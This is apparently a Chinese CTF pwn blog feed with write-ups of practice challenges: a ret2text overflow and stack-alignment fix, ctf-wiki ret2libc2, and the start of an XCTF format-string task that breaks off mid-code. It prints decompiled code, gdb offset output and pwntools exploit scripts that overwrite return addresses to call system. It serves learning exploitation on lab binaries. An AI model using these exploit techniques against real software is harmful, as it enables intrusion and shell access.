<span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-40h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"what"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>有个backdoor函数<span class="token keyword">int</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat test.py"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="4：gdb溢出点72"><a href="#4：gdb溢出点72" class="headerlink" title="4：gdb溢出点72"></a>4：gdb溢出点72</h2><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x4005a3 <span class="token operator">&lt;</span>main+44<span class="token operator">></span>:    call   0x400460 <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>   0x4005a8 <span class="token operator">&lt;</span>main+49<span class="token operator">></span>:    mov    eax,0x0   0x4005ad <span class="token operator">&lt;</span>main+54<span class="token operator">></span>:    leave  <span class="token operator">=</span><span class="token operator">></span> 0x4005ae <span class="token operator">&lt;</span>main+55<span class="token operator">></span>:    ret       0x4005af <span class="token operator">&lt;</span>backdoor<span class="token operator">></span>:    push   rbp   0x4005b0 <span class="token operator">&lt;</span>backdoor+1<span class="token operator">></span>:    mov    rbp,rsp   0x4005b3 <span class="token operator">&lt;</span>backdoor+4<span class="token operator">></span>:    lea    rdi,<span class="token punctuation">[</span>rip+0x9f<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 0x400659</span>   0x4005ba <span class="token operator">&lt;</span>backdoor+11<span class="token operator">></span>:    call   0x400470 <span class="token operator">&lt;</span>system@plt<span class="token operator">></span><span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0x7fffffffde88 <span class="token punctuation">(</span><span class="token string">"IAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0x7fffffffde90 <span class="token punctuation">(</span><span class="token string">"AJAAfAA5AAKAAgAA6AAL"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0x7fffffffde98 <span class="token punctuation">(</span><span class="token string">"AAKAAgAA6AAL"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0x7fffffffdea0 --<span class="token operator">></span> 0x4c414136 <span class="token punctuation">(</span><span class="token string">'6AAL'</span><span class="token punctuation">)</span>0032<span class="token operator">|</span> 0x7fffffffdea8 --<span class="token operator">></span> 0x400577 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">></span>:    push   rbp<span class="token punctuation">)</span>0040<span class="token operator">|</span> 0x7fffffffdeb0 --<span class="token operator">></span> 0x0 0048<span class="token operator">|</span> 0x7fffffffdeb8 --<span class="token operator">></span> 0xb7de885b3d5ed61a 0056<span class="token operator">|</span> 0x7fffffffdec0 --<span class="token operator">></span> 0x400490 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_start<span class="token operator">></span>:    xor    ebp,ebp<span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, value0x00000000004005ae <span class="token keyword">in</span> main <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb-peda$ pattern offset AAdAA3AAdAA3 found at offset: 64gdb-peda$ pattern offset IAAeAIAAeA found at offset: 72gdb-peda$ </code></pre><p>感觉没啥问题</p><h2 id="5：exp"><a href="#5：exp" class="headerlink" title="5：exp"></a>5：exp</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#使程序跳转到backdoor函数即可</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">72</span> <span class="token operator">+</span>   p64<span class="token punctuation">(</span><span class="token number">0x04005af</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="6：执行情况（gdb调试）"><a href="#6：执行情况（gdb调试）" class="headerlink" title="6：执行情况（gdb调试）"></a>6：执行情况（gdb调试）</h2><pre class=" language-bash"><code class="language-bash">RDI: 0x2 RBP: 0x7fffffffdd88 --<span class="token operator">></span> 0x0 RSP: 0x7fffffffdd28 --<span class="token operator">></span> 0x0 RIP: 0x7ffff7a332f6 <span class="token punctuation">(</span><span class="token operator">&lt;</span>do_system+1094<span class="token operator">></span>:    movaps XMMWORD PTR <span class="token punctuation">[</span>rsp+0x40<span class="token punctuation">]</span>,xmm0<span class="token punctuation">)</span>R8 <span class="token keyword">:</span> 0x7ffff7dd1600 --<span class="token operator">></span> 0x0 R9 <span class="token keyword">:</span> 0x0 R10: 0x8 R11: 0x246 R12: 0x400659 <span class="token punctuation">(</span><span class="token string">"cat test.py"</span><span class="token punctuation">)</span>R13: 0x7fffffffdfa0 --<span class="token operator">></span> 0x1 R14: 0x0 R15: 0x0EFLAGS: 0x10246 <span class="token punctuation">(</span>carry PARITY adjust ZERO sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x7ffff7a332e6 <span class="token operator">&lt;</span>do_system+1078<span class="token operator">></span>:    movq   xmm0,QWORD PTR <span class="token punctuation">[</span>rsp+0x8<span class="token punctuation">]</span>   0x7ffff7a332ec <span class="token operator">&lt;</span>do_system+1084<span class="token operator">></span>:    mov    QWORD PTR <span class="token punctuation">[</span>rsp+0x8<span class="token punctuation">]</span>,rax   0x7ffff7a332f1 <span class="token operator">&lt;</span>do_system+1089<span class="token operator">></span>:    movhps xmm0,QWORD PTR <span class="token punctuation">[</span>rsp+0x8<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> 0x7ffff7a332f6 <span class="token operator">&lt;</span>do_system+1094<span class="token operator">></span>:    movaps XMMWORD PTR <span class="token punctuation">[</span>rsp+0x40<span class="token punctuation">]</span>,xmm0     <span class="token comment" spellcheck="true">#程序到这里死活不能动</span>   0x7ffff7a332fb <span class="token operator">&lt;</span>do_system+1099<span class="token operator">></span>:    call   0x7ffff7a23110 <span class="token operator">&lt;</span>__GI___sigaction<span class="token operator">></span>   0x7ffff7a33300 <span class="token operator">&lt;</span>do_system+1104<span class="token operator">></span>:    lea    rsi,<span class="token punctuation">[</span>rip+0x39e2f9<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 0x7ffff7dd1600 &lt;quit></span>   0x7ffff7a33307 <span class="token operator">&lt;</span>do_system+1111<span class="token operator">></span>:    xor    edx,edx   0x7ffff7a33309 <span class="token operator">&lt;</span>do_system+1113<span class="token operator">></span>:    mov    edi,0x3<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0x7fffffffdd28 --<span class="token operator">></span> 0x0 0008<span class="token operator">|</span> 0x7fffffffdd30 --<span class="token operator">></span> 0x7ffff7b97e97 --<span class="token operator">></span> 0x2f6e69622f00632d <span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0x7fffffffdd38 --<span class="token operator">></span> 0x0 0024<span class="token operator">|</span> 0x7fffffffdd40 --<span class="token operator">></span> 0x1 0032<span class="token operator">|</span> 0x7fffffffdd48 --<span class="token operator">></span> 0x7ffff7a33360 <span class="token punctuation">(</span><span class="token operator">&lt;</span>cancel_handler<span class="token operator">></span>:    push   rbx<span class="token punctuation">)</span>0040<span class="token operator">|</span> 0x7fffffffdd50 --<span class="token operator">></span> 0x7fffffffdd44 --<span class="token operator">></span> 0xf7a3336000000000 0048<span class="token operator">|</span> 0x7fffffffdd58 --<span class="token operator">></span> 0x0 0056<span class="token operator">|</span> 0x7fffffffdd60 --<span class="token operator">></span> 0x0 <span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueStopped reason: SIGSEGV0x00007ffff7a332f6 <span class="token keyword">in</span> do_system <span class="token punctuation">(</span>line<span class="token operator">=</span>0x400659 <span class="token string">"cat test.py"</span><span class="token punctuation">)</span> at <span class="token punctuation">..</span>/sysdeps/posix/system.c:125125    <span class="token punctuation">..</span>/sysdeps/posix/system.c: 没有那个文件或目录.gdb-peda$ </code></pre><h2 id="7：原因"><a href="#7：原因" class="headerlink" title="7：原因"></a>7：原因</h2><p><strong>向大佬求助得知，奈何涉及堆栈平衡，适时吾甚愚昧不知所云，只可将0x7ffff7a332f6 &lt;do_system+1094&gt;:    movaps XMMWORD PTR [rsp+0x40],xmm0指令铭记于心，付以esp寄存器需需结尾为0</strong><br><strong>若想根治则反复使用pop  ， ret指令平衡参数或跳转。以及自制代码buf莫要随意限其大小，常见128，512甚好（8的整数倍）</strong></p><h3 id="修改利用ret指令"><a href="#修改利用ret指令" class="headerlink" title="修改利用ret指令"></a>修改利用ret指令</h3><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0xd3 bytes:    <span class="token string">'from pwn import*\n'</span>    <span class="token string">"context.log_level = 'debug'\n"</span>    <span class="token string">'\n'</span>    <span class="token string">"sh = process('./test')\n"</span>    <span class="token string">'sh.recv()\n'</span>    <span class="token string">'#0x000000000040044e : ret\n'</span>    <span class="token string">"payload = 'A'*72 + p64(0x040044e) +  p64(0x04005af)\n"</span>    <span class="token string">'gdb.attach(sh)\n'</span>    <span class="token string">'sh.sendline(payload)\n'</span>    <span class="token string">'\n'</span>    <span class="token string">'sh.interactive()\n'</span>from pwn import*context.log_level <span class="token operator">=</span> <span class="token string">'debug'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span>sh.recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x000000000040044e : ret</span>payload <span class="token operator">=</span> <span class="token string">'A'</span>*72 + p64<span class="token punctuation">(</span>0x040044e<span class="token punctuation">)</span> +  p64<span class="token punctuation">(</span>0x04005af<span class="token punctuation">)</span>gdb.attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh.sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh.interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  </code></pre><p><strong>所以以后能跳转到system函数时出错看看是不是这个原因</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wiki-ret2libc2</title>
      <link href="/2020/07/06/wiki-ret2libc2/"/>
      <url>/2020/07/06/wiki-ret2libc2/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/wiki/overflow$ checksec ret2libc2<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/wiki/overflow/ret2libc2'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span></code></pre><p>又是只有NX开启的常规操作</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-64h]</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Something surprise here, but I don't think it will work."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What do you think ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>显然gets这里有栈溢出，用IDA检查字符串发现有system函数，但是没有/bin/sh字符串</strong></p><h2 id="3：gdb调试测其溢出点"><a href="#3：gdb调试测其溢出点" class="headerlink" title="3：gdb调试测其溢出点"></a>3：gdb调试测其溢出点</h2><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>EAX: 0x0 EBX: 0x0 ECX: 0xf7fb25c0 --<span class="token operator">></span> 0xfbad2288 EDX: 0xf7fb389c --<span class="token operator">></span> 0x0 ESI: 0xf7fb2000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0x6941414d <span class="token punctuation">(</span><span class="token string">'MAAi'</span><span class="token punctuation">)</span>ESP: 0xffffd03c <span class="token punctuation">(</span><span class="token string">"AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>EIP: 0x80486c5 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+125<span class="token operator">></span>:    ret<span class="token punctuation">)</span>EFLAGS: 0x246 <span class="token punctuation">(</span>carry PARITY adjust ZERO sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x80486ba <span class="token operator">&lt;</span>main+114<span class="token operator">></span>:    call   0x8048460 <span class="token operator">&lt;</span>gets@plt<span class="token operator">></span>   0x80486bf <span class="token operator">&lt;</span>main+119<span class="token operator">></span>:    mov    eax,0x0   0x80486c4 <span class="token operator">&lt;</span>main+124<span class="token operator">></span>:    leave  <span class="token operator">=</span><span class="token operator">></span> 0x80486c5 <span class="token operator">&lt;</span>main+125<span class="token operator">></span>:    ret       0x80486c6:    xchg   ax,ax   0x80486c8:    xchg   ax,ax   0x80486ca:    xchg   ax,ax   0x80486cc:    xchg   ax,ax<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffd03c <span class="token punctuation">(</span><span class="token string">"AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffffd040 <span class="token punctuation">(</span><span class="token string">"ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0xffffd044 <span class="token punctuation">(</span><span class="token string">"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0012<span class="token operator">|</span> 0xffffd048 <span class="token punctuation">(</span><span class="token string">"AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0xffffd04c <span class="token punctuation">(</span><span class="token string">"AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0020<span class="token operator">|</span> 0xffffd050 <span class="token punctuation">(</span><span class="token string">"PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffffd054 <span class="token punctuation">(</span><span class="token string">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffd058 <span class="token punctuation">(</span><span class="token string">"AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, value0x080486c5    30    <span class="token keyword">in</span> ret2libc.cgdb-peda$ pattern offset AA8AAA8A found at offset: 112gdb-peda$ </code></pre><p>溢出点为112</p><h2 id="4：思路"><a href="#4：思路" class="headerlink" title="4：思路"></a>4：思路</h2><p><strong>首先因为在程序中可以直接利用system函数，还有栈溢出跳转到system函数，接下来就是想办法得到/bin/sh字符串。</strong><br><strong>一般的如果题目没有给libc文件不老要想着找到libc地址来解题。那么不考虑libc文件中的/bin/sh字符串，我们看能不能利用输入来获得该字符串。</strong><br><strong>仔细看IDA主函数的伪代码会发现有个函数将bss段清零了（当然bss一般本来就是0）这应该就是给我们提示了，利用bss段全局变量来存放我们输入的/bin/sh，这样就可以让system函数利用这个字符串。那么输入函数这里直接有gets函数。ok构造exp</strong></p><h2 id="5：exp"><a href="#5：exp" class="headerlink" title="5：exp"></a>5：exp</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'ret2libc2'</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>gets_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'gets'</span><span class="token punctuation">]</span>bss_addr <span class="token operator">=</span> <span class="token number">0x0804A040</span>   <span class="token comment" spellcheck="true">#bss段的地址都可以在IDA找到</span>main <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span> sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc2'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gets_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h3><p>之前我一直认为这个payload=payload = “A”<em>112 + p32(gets_plt) + p32(system_addr) + p32(bss_addr) + p32(system_ret) + p32(bss_addr)是完全没问题的，system_ret即将作为system函数的返回地址。<br>我这么认为是因为，我以为用p32(gets_plt）执行后p32(system_addr)作为返回地址，p32(bss_addr)作为参数：程序将跳转到system函数，<del>而p32(bss_addr)将被gets函数从栈中取出</del><br>**</em>后面这个想法大错特错，用gdb调试发现返回地址，和参数一直都在栈中，只是利用参数时会进行值的传递，而不是取出。**<br><img src="https://s1.ax1x.com/2020/07/06/UCWhEq.png" alt="函数调用过程"></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wiki--pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-string</title>
      <link href="/2020/07/04/xctf-string/"/>
      <url>/2020/07/04/xctf-string/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_easy$ checksec string<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_easy/string'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span></code></pre><p>保护全开有点狠，但是不用慌，这应该告诉我们栈溢出控制程序是不可能的了</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><p>程序比较大，下面是进行拆分排序后的函数组合</p><pre class=" language-c"><code class="language-c">main：__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  _DWORD <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST18_8</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">60u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_400996</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                 <span class="token comment" spellcheck="true">// 菜单输出，不用在意</span>  v3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token comment" spellcheck="true">// 开辟内存空间</span>  v4 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v3<span class="token punctuation">;</span>  <span class="token operator">*</span>v3 <span class="token operator">=</span> <span class="token number">68</span><span class="token punctuation">;</span>  v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">85</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"we are wizard, we will give you hand, you can not defeat dragon by yourself ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"we will tell you two secret ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"secret[0] is %x\n"</span><span class="token punctuation">,</span> v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// 将输出第一个和第二个元素的地址</span>                                                <span class="token comment" spellcheck="true">// </span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"secret[1] is %x\n"</span><span class="token punctuation">,</span> v4 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"do not tell anyone "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_400D72</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">// 将开辟内存空间传入该函数</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"The End.....Really?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span>sub_400D72函数：<span class="token comment" spellcheck="true">// a1是前面开辟内存空间的地址</span><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_400D72</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-20h]</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What should your character's name be:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">12</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Creating a new player."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_400A7D</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">// 只能输入east</span>    <span class="token function">sub_400BB9</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">// 格式化字符串漏洞</span>    <span class="token function">sub_400CA6</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// 映射一个大小为4096字节的空间 该空间由读写执行权 传入了开辟空间的地址a1</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Hei! What's up!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span>sub_400A7D函数：执行后我们能且只能输入east，没多大用sub_400BB9函数：<span class="token keyword">unsigned</span> __int64 <span class="token function">sub_400BB9</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4h] [rbp-7Ch]</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-78h]</span>  <span class="token keyword">char</span> format<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-70h]</span>  <span class="token keyword">unsigned</span> __int64 v4<span 